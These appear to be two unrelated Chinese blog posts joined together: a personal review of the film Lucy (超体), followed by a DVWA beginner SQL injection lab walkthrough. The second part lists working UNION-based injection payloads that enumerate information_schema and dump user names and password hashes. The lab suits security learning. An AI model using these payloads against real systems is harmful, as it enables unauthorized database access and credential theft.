超体_电影观后感

刚刚看完电影超体，之前看了一遍，现在又来补上一遍，吸引我来看第二遍的原因一是看看斯嘉丽·约翰逊，二是再感受一下大脑在不断开发后，出现的神奇现象。

先来看看电影的制作人：

之前不认识斯嘉丽·约翰逊，后来才得知她号称“梦露第二”，后来又看了她用声音出演的电影《Her》（很棒的电影，剧情上不敢说好，但做工很精良，画面细腻，色彩惊艳，在我top20中占有一席之地，下次看第过二遍再来细聊~），即使完全没有露面，只是用声音演出，也让她夺得罗马电影节的影后桂冠，可想她的glamour（刚刚背过的英文单词，拿来献丑[羞耻脸]），说实话，看完电影后，感觉斯嘉丽没有达到我心中的预期，但声音还是很棒的。

到了大学期间，慢慢的成熟，对事情有了自己的见解，独立思考，探索本质，我喜欢“本质”这个词，我喜欢以不变应万变，渴望了然于胸运用自如，所以当我知道人的大脑只是开发运用了一小部分时，就不得不惊叹，假如不断强化大脑时，人类和世界将会怎样，会不会感受到地球的本质，触摸到宇宙的真谛，《超体》就是这么吸引了我。我看的电影数量只能说是比普通人多一些，在我看过的电影中没有一部是讲大脑开发利用的，所以这个电影的题材很好。

电影主要讲了女主Lucy被男友强行拉出去帮他送东西给张先生，张先生却将Lucy抓住，因为他也不知道东西的来历，更不知道是谁给他送东西，后来不知怎么的张先生就知道了送来的东西是什么（编剧是硬伤！），就是一种类似于毒品的药物–CPH4，张先生得知Lucy啥也不知道后，索性用她帮自己送药给欧洲的买家，在送货途中，Lucy偶然将CPH4吸收到体内，从此超神，慢慢的感受大脑开发率从10%到100%的过程，太神奇，不得不说，虽然斯嘉丽在电影中没有满足我的期望，但Lucy超神后的表现，却直击我的兴奋点，从感受自己，到感受别人，最后感受宇宙万物，我觉着这就是窥见了本质，我期望的本质。

电影虽然在剧情方面硬伤不断，但其中科幻的部分确实能给我或者人们臆想的空间。电影中有一个点，是Lucy在医院的手术台上给她妈妈打电话，Lucy在精神上超出世人，同样也超出了她妈妈，她打电话一方面是刚刚获得超能力而又有一丝惊慌的女儿渴望得到家人的慰藉，另一方面也是Lucy和她妈妈的一个告别，在物质上她们不能联系了，Lucy因为大脑的超频利用消耗了生命，没多长时间能活了，在精神上，Lucy已经和她妈妈之间已经失去了共鸣（言辞匮乏，不能顺畅的描述这一段）。

好奇心是我前进的动力，不断探索是我人生的基调，我要寻找本质，寻找答案，希望你也是。

最后附上女神神气满满的剧照！

dvwa初级sql注入试炼

今天来试炼sql注入

  1. 首先对输入框进行注入测试输入 1 ，此时得到下图

    我们会发现url中有id=1，页面中会出现firstname 和 surname 两个返回值，现在还要确认是字符型注入还是数字型注入，输入1’ ，此时会报错，再输入1’# 时，返回正确，可以确认是属于字符型注入，此时可以猜想出后台的sql查询语句可能是这样的：select firstname,surname from [未知表名] where id =‘1’ ;

  2. 猜测字段数，输入 1’ order by 1 # ， 返回正确

输入 1’ order by 2 # ， 返回正确，输入 1’ order by 3 # ， 返回错误，可以猜测字段数为2.
  1. 设法让后台返回一些信息，输入 1’ union select 1,2 # ，返回正确

1' union select database(),user() # //返回db名和用户名

1' union select version(),@@version_compile_os # //返回db所在系统版本和db版本

  1. 在mysql中有一个特殊的数据库information_schema，就像一个字典，包含本db中所有的表名和列名，数据库中有两个表information_schema.tables和information_schema.columns，可以通过这两个表获取信,构造注入语句：

//获取表信息
1' union select table_name,2 from information_schema.tables where table_schema='dvwa'#
PS:dvwa的十六进制是0x64767761，直接将十六进制放到’dvwa’出也可以查询

//获取选定表的列信息
1' union select column_name,2 from information_schema.columns where table_name='users' and table_schema='dvwa'#

  1. 获取admin

1' union select user,password from users #

Done!

PS:information_schema中还有一个schemata表，存放着mysql中整个数据库的名字，构造代码: 1’union select group_concat(schema_name),2 from information_schema.schemata #
//其中group_concat()函数是将schema_name 表的内容整合到一个地方显示，group_concat(字段名,分隔符_Hex,另一个字段名)，可以将两个字段分开，方便查看
